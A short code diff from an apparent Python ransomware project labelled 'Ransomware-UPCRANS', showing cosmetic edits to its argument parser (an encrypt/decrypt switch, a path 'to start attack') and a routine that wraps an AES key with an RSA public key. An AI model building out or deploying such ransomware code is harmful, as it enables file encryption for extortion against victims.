@@ -28,10 +28,8 @@ def parse_args():
     parser = argparse.ArgumentParser(description='Ransomware-UPCRANS')
 
     group = parser.add_mutually_exclusive_group(required=True)
-    group.add_argument('--encrypt', help='Encrypt files',
-                        action='store_true')
-    group.add_argument('--decrypt', help='Decrypt files',
-                        action='store_true')
+    group.add_argument('--encrypt', help='Encrypt files', action='store_true')
+    group.add_argument('--decrypt', help='Decrypt files', action='store_true')
 
     parser.add_argument('--path', help='Path to start attack', action="store", required = '--encrypt' in sys.argv) 
     parser.add_argument('--AESkey', help='Path of the key', action="store", required='--decrypt' in sys.argv) 
@@ -93,8 +91,8 @@ def initialize_keys():
 
 
 # Encrypt KEY (AES) with public key (RSA).
-def encrypt_key(AESkey, key):
-    public_key = RSA.importKey(key)
+def encrypt_key(AESkey, keyEnc):
+    public_key = RSA.importKey(keyEnc)
     encryptor = PKCS1_OAEP.new(public_key)
     encrypted_key = encryptor.encrypt(AESkey)
     return encrypted_key
